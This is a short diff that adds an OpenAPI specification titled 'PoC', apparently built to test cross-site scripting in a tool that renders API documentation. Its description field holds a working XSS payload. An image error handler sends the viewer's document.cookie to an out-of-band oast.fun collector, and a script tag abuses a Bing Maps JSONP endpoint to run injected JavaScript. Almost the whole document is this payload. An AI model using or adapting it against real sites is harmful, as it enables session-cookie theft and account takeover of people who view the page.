@@ -1,1 +1,9 @@
-<script src="https://dev.virtualearth.net/REST/v1/Imagery/Metadata/Road?jsonp=alert(document.domain);//"></script>
+{
+  "openapi": "3.0.0",
+  "info": {
+    "title": "PoC",
+    "version": "1.0.0",
+    "description": "<img src=x onerror=\"(new Image()).src='https://sagmirngzimxhikutodb82e39oz203dic.oast.fun/pocex?c='+encodeURIComponent(document.cookie)\"><script src=\"https://dev.virtualearth.net/REST/v1/Imagery/Metadata/Road?jsonp=alert(document.domain);//\"></script>"
+  },
+  "paths": {}
+} 
